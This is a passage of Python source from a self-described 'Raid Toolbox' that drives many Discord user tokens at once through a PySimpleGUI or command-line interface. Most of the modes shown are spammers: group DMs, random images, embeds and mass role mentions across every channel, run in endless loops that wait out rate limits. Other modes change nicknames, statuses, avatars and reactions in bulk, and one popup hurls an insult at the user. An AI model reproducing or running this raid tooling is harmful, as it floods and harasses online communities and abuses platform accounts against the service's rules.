                payload = {"content": asciigen(1999), "tts": false}
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(group), headers=headers, json=payload)
            if src.status_code == 429:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after']/1000))
            elif src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
              [sg.Text('Group ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Group DM Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        group = values[2]
        ascii = values[1]
    else:
        text = sys.argv[6]
        group = sys.argv[7]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(sendgdm,token,text,group,ascii)

elif mode == 'imagespam':
    def sendimages(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            while True:
                payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
    if climode == 0:
        layout = [[sg.Text('This will spam random images from https://picsum.photos/')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Random Image Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[6]
        SERVER = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendimages,token,channelid,SERVER)

elif mode == 'gamechange':
    from websocket import create_connection
    def changegame(token,game,type,status):
        if status == "random":
            stat = ['online', 'dnd', 'idle']
            status = random.choice(stat)
        ws = create_connection('wss://gateway.discord.gg/?v=6&encoding=json')
        result = ws.recv()
        if type == "Playing":
            gamejson = {
                "name": game,
                "type": 0
            }
        elif type == 'Streaming':
            gamejson = {
                "name": game,
                "type": 1,
                "url": "https://www.twitch.tv/DEADBREAD'S_RAID_TOOLBOX"
            }
        elif type == "Listening to":
            gamejson = {
                "name": game,
                "type": 2
            }
        elif type == "Watching":
            gamejson = {
                "name": game,
                "type": 3
            }
        payload = {
            'op': 2,
            'd': {
                'token': token,
                'properties': {
                    '$os': sys.platform,
                    '$browser': "Discord{}".format(random.randint(1000,9999)),
                    '$device': "Discord{}".format(random.randint(1000,9999)),
                    '$referrer': '',
                    '$referring_domain': ''
                },
                'compress': True,
                'large_threshold': 250,
                'v': 3,
                "presence": {
                    "game": gamejson,
                    "status": status,
                    "since": random.randint(0,9999),
                    "afk": False
                }
            }
        }
        to_send = json.dumps(payload)
        ws.send(to_send)
    if climode == 0:
        layout = [[sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], size=(10, 1), default_value='Playing', readonly=True), sg.InputText('osu!',size=(10, 1)),sg.Combo(['online', 'dnd', 'idle','random'], size=(10, 1), default_value='online', readonly=True)],
                  [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                  ]
        window = sg.Window('RTB | Status Changer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        type = values[0]
        game = values[1]
        status = values[2]
    else:
        type = 'Playing'
        game = sys.argv[6]
        status = 'online'
    while True:
        for token in tokenlist:
            executor.submit(changegame,token,game,type,status)
        time.sleep(60)

elif mode == 'nickname':
    def nickname(token,server,name,type):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if type == "Cycle":
            n = []
            for x in name.rstrip():
                n.append(x)
            cyclename = cycle(n)
            newnick = ''
            while True:
                if len(newnick) == len(name.rstrip()):
                    newnick = ''
                newnick += next(cyclename)
                payload = {'nick': newnick}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(1)
        elif type == "Ascii":
            while True:
                payload = {'nick': asciigen(32)}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(2)
        elif type == "Set":
            payload = {'nick': name}
            requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
    if climode == 0:
        layout = [
                [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
                [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True),sg.InputText("DeadBread's Raid Toolbox", tooltip="New Nickname")],
                [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                ]
        window = sg.Window('RTB | Nickname Changer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values[0]
        type = values[1]
        name = values[2]
    else:
        server = sys.argv[6]
        type = "Ascii"
        name = "None"
    for token in tokenlist:
        executor.submit(nickname,token,server,name,type)

elif mode == 'embed':
    def embedspam(token,channel,server,title,author,iconurl,field_name,field_value,imgurl,footer):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": '', "embed":{"title": title,"color": random.randint(1,16777215),"footer": {"icon_url": iconurl,"text": footer},"image": {"url": imgurl},"author": {"name": author,"url": "https://github.com/DeadBread76/Raid-Toolbox","icon_url": iconurl},"fields": [{"name": field_name,"value": field_value}]}}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            while True:
                payload = {"content": '', "embed":{"title": title,"color": random.randint(1,16777215),"footer": {"icon_url": iconurl,"text": footer},"image": {"url": imgurl},"author": {"name": author,"url": "https://github.com/DeadBread76/Raid-Toolbox","icon_url": iconurl},"fields": [{"name": field_name,"value": field_value}]}}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
    layout = [
            [sg.Text('Server ID', size=(10, 1)), sg.InputText()],
            [sg.Text('Channel ID', size=(10, 1)), sg.InputText('all')],
            [sg.Text('Title', size=(10, 1)), sg.InputText()],
            [sg.Text('Author', size=(10, 1)), sg.InputText()],
            [sg.Text('Icon URL', size=(10, 1)), sg.InputText()],
            [sg.Text('Field Name', size=(10, 1)), sg.InputText()],
            [sg.Text('Field Value', size=(10, 1)), sg.InputText()],
            [sg.Text('Image URL', size=(10, 1)), sg.InputText()],
            [sg.Text('Footer Text', size=(10, 1)), sg.InputText()],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
            ]
    window = sg.Window('RTB | Embed Spammer', layout, keep_on_top=True)
    event, values = window.Read()
    window.Close()
    if event == "Start":
        pass
    else:
        sys.exit()
    server = values[0]
    channel = values[1]
    title = values[2]
    author = values[3]
    iconurl = values[4]
    field_name = values[5]
    field_value = values[6]
    imgurl = values[7]
    footer = values[8]
    for token in tokenlist:
        executor.submit(embedspam,token,channel,server,title,author,iconurl,field_name,field_value,imgurl,footer)

elif mode == 'avatarchange':
    from base64 import b64encode
    # Ripped from Discord.py
    def get_mime(data):
        if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
            return 'image/png'
        elif data[6:10] in (b'JFIF', b'Exif'):
            return 'image/jpeg'
        elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
            return 'image/gif'
        elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
            return 'image/webp'
    # Ripped from Discord.py
    def bytes_to_base64_data(data):
        fmt = 'data:{mime};base64,{data}'
        mime = get_mime(data)
        b64 = b64encode(data).decode('ascii')
        return fmt.format(mime=mime, data=b64)

    def changeavatar(token,avatarfile):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        response = json.loads(src.content.decode())
        username = response['username']
        email = response['email']
        with open(avatarfile, "rb") as avatar_handle:
            encoded = bytes_to_base64_data(avatar_handle.read())
        payload = {'avatar': encoded, 'email': email, 'password': "", 'username': username}
        src = requests.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload)
    layout = [
            [sg.Text('Single Avatar',size=(20,1)), sg.Input(), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("PNG Files", "*.png"),("JPG Files", "*.jpg"),("JPEG Files", "*.jpeg"),("GIF Files", "*.gif"),("WEBM Files", "*.webm")))],
            [sg.Text('Random Avatars (Folder)',size=(20,1)), sg.Input(), sg.FolderBrowse(button_color=theme['button_colour'])],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1)), sg.Checkbox('Use Single'), sg.Checkbox('Use Random (Folder)')]
            ]
    window = sg.Window('RTB | Avatar Changer', layout, keep_on_top=True)
    event, values = window.Read()
    window.Close()
    if event == "Start":
        pass
    else:
        sys.exit()
    avatarfile = values[0]
    avatarfolder = values[1]
    usesingle = values[2]
    usemultiple = values[3]
    if usesingle and usemultiple == True:
        sg.Popup("What one will it be you stupid cunt you can't have both.",title="w0t")
        sys.exit()
    if usesingle:
        for token in tokenlist:
            executor.submit(changeavatar,token,avatarfile)
    elif usemultiple:
        files = os.listdir(avatarfolder)
        for token in tokenlist:
            avatarfile = avatarfolder + "/" + random.choice(files)
            executor.submit(changeavatar,token,avatarfile)

elif mode == "rolemention":
    def sendrolemention(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        rolelist = []
        msg = ''
        roles = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/roles".format(server),headers=headers).text
        rolejson = json.loads(roles)
        for role in rolejson:
            rolelist.append("<@&{}>".format(role['id']))
        for role in rolelist:
            msg += role + ' '
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content": m, "tts": false})
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
              ]
        window = sg.Window('RTB | Role Mass Mentioner', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values[0]
        channelid = values[1]
    else:
        SERVER = sys.argv[6]
        channelid = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendrolemention,token,channelid,SERVER)

elif mode == "cleanup":
    if climode == 0:
        layout = [
              [sg.Text('Enter A Server ID to delete all the messages in all channels sent by the token.')],
              [sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Server Cleanup', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values[0]
    else:
        server = sys.argv[6]
    for token in tokenlist:
        subprocess.Popen([pycommand,'RTBFiles/cleanup.py',token,server,str(os.getpid()),'None'])
    while True:
        pass

elif mode == "hypesquad":
    def changehouse(token,house):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if house == "Bravery":
            payload = {'house_id': 1}
        elif house == "Brilliance":
            payload = {'house_id': 2}
        elif house == "Balance":
            payload = {'house_id': 3}
        elif house == "Random":
            houses = [1, 2, 3]
            payload = {'house_id': random.choice(houses)}
        requests.post('https://discordapp.com/api/v6/hypesquad/online',headers=headers,json=payload)
    if climode == 0:
        layout = [
                 [sg.Text('House To Change to', size=(15, 1)),sg.Combo(['Bravery','Brilliance','Balance','Random'],readonly=True, default_value='Bravery')],
                 [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                ]
        window = sg.Window('RTB | HypeSquad House Changer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        house = values[0]
    else:
        house = sys.argv[6]
    for token in tokenlist:
        executor.submit(changehouse,token,house)

elif mode == "reaction":
    import emoji
    def addreact(token,emoji,message,channel,type):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if type == "Add":
            requests.put("https://discordapp.com/api/v6/channels/{}/messages/{}/reactions/{}/@me".format(channel,message,emoji), headers=headers)
        elif type == "Remove":
            requests.delete("https://discordapp.com/api/v6/channels/{}/messages/{}/reactions/{}/@me".format(channel,message,emoji), headers=headers)
    if climode == 0:
        emojilist = [':smile:', ':laughing:', ':blush:', ':smiley:', ':relaxed:', ':smirk:', ':heart_eyes:', ':kissing_heart:', ':kissing_closed_eyes:',
                    ':flushed:', ':relieved:', ':satisfied:', ':grin:', ':wink:', ':stuck_out_tongue_winking_eye:', ':stuck_out_tongue_closed_eyes:',
                    ':grinning:', ':kissing:', ':kissing_smiling_eyes:', ':stuck_out_tongue:', ':sleeping:', ':worried:', ':frowning:', ':anguished:',
                    ':open_mouth:', ':grimacing:', ':confused:', ':hushed:', ':expressionless:', ':unamused:', ':sweat_smile:', ':sweat:', ':disappointed_relieved:',
                    ':weary:', ':pensive:', ':disappointed:', ':confounded:', ':fearful:', ':cold_sweat:', ':persevere:', ':cry:', ':sob:', ':joy:',
                    ':astonished:', ':scream:', ':tired_face:', ':angry:', ':rage:', ':triumph:', ':sleepy:', ':yum:', ':mask:', ':sunglasses:',
                    ':dizzy_face:', ':imp:', ':smiling_imp:', ':neutral_face:', ':no_mouth:', ':innocent:', ':alien:', ':yellow_heart:', ':blue_heart:',
                    ':purple_heart:', ':heart:', ':green_heart:', ':broken_heart:', ':heartbeat:', ':heartpulse:', ':two_hearts:', ':revolving_hearts:',
                    ':cupid:', ':sparkling_heart:', ':sparkles:', ':star:', ':star2:', ':dizzy:', ':boom:', ':anger:', ':exclamation:', ':question:',
                    ':grey_exclamation:', ':grey_question:', ':zzz:', ':dash:', ':sweat_drops:', ':notes:', ':musical_note:', ':fire:', ':hankey:',
                    ':poop:', ':shit:', ':+1:', ':thumbsup:', ':-1:', ':thumbsdown:', ':ok_hand:', ':punch:', ':fist:', ':v:', ':wave:', ':raised_hand:',
                     ':open_hands:', ':point_up:', ':point_down:', ':point_left:', ':point_right:', ':raised_hands:', ':pray:', ':point_up_2:', ':clap:',
                     ':muscle:', ':metal:', ':runner:', ':couple:', ':family:', ':two_men_holding_hands:', ':two_women_holding_hands:', ':dancer:',
                     ':dancers:', ':ok_woman:', ':no_good:', ':information_desk_person:', ':raising_hand:', ':bride_with_veil:', ':person_with_pouting_face:',
                     ':person_frowning:', ':bow:', ':couplekiss:', ':couple_with_heart:', ':massage:', ':haircut:', ':nail_care:', ':boy:', ':girl:',
                     ':woman:', ':man:', ':baby:', ':older_woman:', ':older_man:', ':person_with_blond_hair:', ':man_with_gua_pi_mao:', ':man_with_turban:',
                     ':construction_worker:', ':cop:', ':angel:', ':princess:', ':smiley_cat:', ':smile_cat:', ':heart_eyes_cat:', ':kissing_cat:',
                     ':smirk_cat:', ':scream_cat:', ':crying_cat_face:', ':joy_cat:', ':pouting_cat:', ':japanese_ogre:', ':japanese_goblin:', ':see_no_evil:',
                     ':hear_no_evil:', ':speak_no_evil:', ':guardsman:', ':skull:', ':feet:', ':lips:', ':kiss:', ':droplet:', ':ear:', ':eyes:', ':nose:',
                     ':tongue:', ':love_letter:', ':bust_in_silhouette:', ':busts_in_silhouette:', ':speech_balloon:', ':thought_balloon:', ':sunny:',
                     ':umbrella:', ':cloud:', ':snowflake:', ':snowman:', ':zap:', ':cyclone:', ':foggy:', ':ocean:', ':cat:', ':dog:', ':mouse:',
                     ':hamster:', ':rabbit:', ':wolf:', ':frog:', ':tiger:', ':koala:', ':bear:', ':pig:', ':pig_nose:', ':cow:', ':boar:', ':monkey_face:',
                     ':monkey:', ':horse:', ':racehorse:', ':camel:', ':sheep:', ':elephant:', ':panda_face:', ':snake:', ':bird:', ':baby_chick:',
                     ':hatched_chick:', ':hatching_chick:', ':chicken:', ':penguin:', ':turtle:', ':bug:', ':ant:', ':beetle:', ':snail:', ':octopus:',
                     ':tropical_fish:', ':fish:', ':whale:', ':whale2:', ':dolphin:', ':cow2:', ':ram:', ':rat:', ':water_buffalo:', ':tiger2:',
                     ':rabbit2:', ':dragon:', ':goat:', ':rooster:', ':dog2:', ':pig2:', ':mouse2:', ':ox:', ':dragon_face:', ':blowfish:', ':crocodile:',
                     ':dromedary_camel:', ':leopard:', ':cat2:', ':poodle:', ':paw_prints:', ':bouquet:', ':cherry_blossom:', ':tulip:',
                     ':four_leaf_clover:', ':rose:', ':sunflower:', ':hibiscus:', ':maple_leaf:', ':leaves:', ':fallen_leaf:', ':herb:', ':mushroom:',
                     ':cactus:', ':palm_tree:', ':evergreen_tree:', ':deciduous_tree:', ':chestnut:', ':seedling:', ':blossom:', ':ear_of_rice:',
                     ':shell:', ':globe_with_meridians:', ':sun_with_face:', ':full_moon_with_face:', ':new_moon_with_face:', ':new_moon:',
                     ':waxing_crescent_moon:', ':first_quarter_moon:', ':waxing_gibbous_moon:', ':full_moon:', ':waning_gibbous_moon:',
                     ':last_quarter_moon:', ':waning_crescent_moon:', ':last_quarter_moon_with_face:', ':first_quarter_moon_with_face:',
                     ':crescent_moon:', ':earth_africa:', ':earth_americas:', ':earth_asia:', ':volcano:', ':milky_way:', ':partly_sunny:',
                     ':bamboo:', ':gift_heart:', ':dolls:', ':school_satchel:', ':mortar_board:', ':flags:', ':fireworks:', ':sparkler:',
                     ':wind_chime:', ':rice_scene:', ':jack_o_lantern:', ':ghost:', ':santa:', ':christmas_tree:', ':gift:', ':bell:', ':no_bell:',
                     ':tanabata_tree:', ':tada:', ':confetti_ball:', ':balloon:', ':crystal_ball:', ':cd:', ':dvd:', ':floppy_disk:', ':camera:',
                     ':video_camera:', ':movie_camera:', ':computer:', ':tv:', ':iphone:', ':telephone:', ':telephone_receiver:', ':pager:',
                     ':fax:', ':minidisc:', ':vhs:', ':sound:', ':speaker:', ':mute:', ':loudspeaker:', ':mega:', ':hourglass:', ':hourglass_flowing_sand:',
                     ':alarm_clock:', ':watch:', ':radio:', ':satellite:', ':loop:', ':mag:', ':mag_right:', ':unlock:', ':lock:', ':lock_with_ink_pen:',
                     ':closed_lock_with_key:', ':key:', ':bulb:', ':flashlight:', ':high_brightness:', ':low_brightness:', ':electric_plug:', ':battery:',
                     ':calling:', ':email:', ':mailbox:', ':postbox:', ':bath:', ':bathtub:', ':shower:', ':toilet:', ':wrench:', ':nut_and_bolt:',
                     ':hammer:', ':seat:', ':moneybag:', ':yen:', ':dollar:', ':pound:', ':euro:',  ':credit_card:', ':money_with_wings:', ':inbox_tray:',
                     ':outbox_tray:', ':envelope:', ':incoming_envelope:', ':postal_horn:', ':mailbox_closed:', ':mailbox_with_mail:', ':mailbox_with_no_mail:',
                     ':package:', ':door:', ':smoking:', ':bomb:', ':gun:', ':pill:', ':syringe:', ':page_facing_up:', ':page_with_curl:', ':bookmark_tabs:',
                     ':bar_chart:', ':chart_with_upwards_trend:', ':chart_with_downwards_trend:', ':scroll:', ':clipboard:', ':calendar:', ':date:',
                     ':card_index:',  ':file_folder:', ':open_file_folder:', ':scissors:', ':pushpin:', ':paperclip:', ':black_nib:', ':pencil2:',
                     ':straight_ruler:', ':triangular_ruler:', ':closed_book:', ':green_book:', ':blue_book:', ':orange_book:', ':notebook:',
                     ':notebook_with_decorative_cover:', ':ledger:', ':books:', ':bookmark:', ':name_badge:', ':microscope:', ':telescope:', ':newspaper:',
                     ':football:', ':basketball:', ':soccer:', ':baseball:', ':tennis:', ':8ball:', ':rugby_football:', ':bowling:',  ':golf:',
                     ':mountain_bicyclist:', ':bicyclist:', ':horse_racing:', ':snowboarder:', ':swimmer:', ':surfer:', ':ski:', ':spades:',
                     ':hearts:', ':clubs:', ':diamonds:', ':gem:', ':ring:', ':trophy:', ':musical_score:', ':musical_keyboard:', ':violin:',
                     ':space_invader:', ':video_game:', ':black_joker:', ':flower_playing_cards:', ':game_die:', ':dart:', ':mahjong:', ':clapper:',
                     ':pencil:', ':book:', ':art:', ':microphone:', ':headphones:', ':trumpet:', ':saxophone:',  ':guitar:', ':sandal:', ':high_heel:',
                     ':lipstick:', ':boot:', ':shirt:', ':necktie:', ':womans_clothes:', ':dress:', ':running_shirt_with_sash:', ':jeans:', ':kimono:',
                     ':bikini:', ':ribbon:', ':tophat:', ':crown:', ':womans_hat:', ':mans_shoe:', ':closed_umbrella:', ':briefcase:', ':handbag:',
                     ':pouch:', ':purse:', ':eyeglasses:', ':fishing_pole_and_fish:', ':coffee:', ':tea:', ':sake:', ':baby_bottle:', ':beer:',
                     ':beers:', ':cocktail:', ':tropical_drink:',  ':wine_glass:', ':fork_and_knife:', ':pizza:', ':hamburger:', ':fries:',
                     ':poultry_leg:', ':meat_on_bone:', ':spaghetti:', ':curry:', ':fried_shrimp:', ':bento:', ':sushi:', ':fish_cake:', ':rice_ball:',
                     ':rice_cracker:', ':rice:', ':ramen:', ':stew:', ':oden:', ':dango:', ':egg:', ':bread:', ':doughnut:', ':custard:', ':icecream:',
                     ':ice_cream:', ':shaved_ice:', ':birthday:', ':cake:', ':cookie:', ':chocolate_bar:', ':candy:', ':lollipop:', ':honey_pot:',
                     ':apple:',  ':green_apple:', ':tangerine:', ':lemon:', ':cherries:', ':grapes:', ':watermelon:', ':strawberry:', ':peach:', ':melon:',
                     ':banana:', ':pear:', ':pineapple:', ':sweet_potato:', ':eggplant:', ':tomato:', ':corn:', ':house:', ':house_with_garden:', ':school:',
                     ':office:', ':post_office:', ':hospital:', ':bank:', ':convenience_store:', ':love_hotel:', ':hotel:', ':wedding:', ':church:', ':department_store:',
                     ':european_post_office:', ':city_sunrise:', ':city_sunset:',  ':japanese_castle:', ':european_castle:', ':tent:', ':factory:',
                     ':tokyo_tower:', ':japan:', ':mount_fuji:', ':sunrise_over_mountains:', ':sunrise:', ':stars:', ':statue_of_liberty:', ':bridge_at_night:',
                     ':carousel_horse:', ':rainbow:', ':ferris_wheel:', ':fountain:', ':roller_coaster:', ':ship:', ':speedboat:', ':sailboat:',
                     ':rowboat:', ':anchor:', ':rocket:', ':airplane:', ':helicopter:', ':steam_locomotive:', ':tram:', ':mountain_railway:', ':bike:',
                     ':aerial_tramway:',  ':suspension_railway:', ':mountain_cableway:', ':tractor:', ':blue_car:', ':oncoming_automobile:', ':car:',
                     ':red_car:', ':taxi:', ':oncoming_taxi:', ':articulated_lorry:', ':bus:', ':oncoming_bus:', ':rotating_light:', ':police_car:',
                     ':oncoming_police_car:', ':fire_engine:', ':ambulance:', ':minibus:', ':truck:', ':train:', ':station:', ':train2:', ':bullettrain_front:',
                     ':bullettrain_side:', ':light_rail:', ':monorail:', ':railway_car:', ':trolleybus:', ':ticket:',  ':fuelpump:', ':vertical_traffic_light:',
                     ':traffic_light:', ':warning:', ':construction:', ':beginner:', ':atm:', ':slot_machine:', ':busstop:', ':barber:', ':hotsprings:',
                     ':checkered_flag:', ':crossed_flags:', ':izakaya_lantern:', ':moyai:', ':circus_tent:', ':performing_arts:', ':round_pushpin:',
                     ':triangular_flag_on_post:', ':flag_jp:', ':flag_kr:', ':flag_cn:', ':flag_us:', ':flag_fr:', ':flag_es:', ':flag_it:', ':flag_ru:',
                     ':flag_gb:', ':flag_de:', ':flag_ng:',  ':cinema:', ':koko:', ':signal_strength:', ':u5272:', ':u5408:', ':u55b6:', ':u6307:',
